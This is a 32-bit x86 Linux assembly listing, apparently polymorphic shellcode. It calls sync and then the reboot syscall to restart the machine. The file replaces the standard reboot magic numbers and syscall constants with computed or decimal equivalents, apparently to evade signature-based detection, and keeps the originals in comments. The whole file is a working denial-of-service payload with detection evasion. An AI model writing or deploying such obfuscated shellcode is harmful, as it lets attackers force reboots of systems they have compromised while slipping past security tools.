global _start

section .text

_start:
    xor eax, eax
    ;mov al,0x24
    mov al, 0x12
    add al, al
    int 0x80

    ;xor eax,eax move to start
    ;mov al,0x58
    add al, 0x58 ;eax is 0 on successful return
    ;mov ebx, 0xfee1dead 
    mov ebx, 0x7f70ef56
    add ebx, ebx
    inc ebx
    ;mov ecx, 0x28121969
    mov ecx, 672274793 ; different magic number
    mov edx, 0x1234567 ;  reboot
    int 0x80

    ;the following instructions can be removed
    ;xor eax,eax
    ;mov al,0x1
    ;xor ebx,ebx
    ;int 0x80

